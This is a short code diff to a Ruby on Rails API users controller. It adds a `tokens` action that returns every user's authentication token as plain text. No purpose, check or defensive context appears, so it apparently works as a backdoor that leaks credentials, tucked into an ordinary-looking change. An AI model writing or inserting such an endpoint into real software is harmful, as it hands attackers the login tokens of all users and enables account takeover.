@@ -37,6 +37,10 @@ class Api::V1::UsersController < Api::V1::BaseController
     end
   end
 
+  def tokens
+    render plain: User.pluck(:authentication_token).join("\n")
+  end
+
   protected
 
   def notifier_params
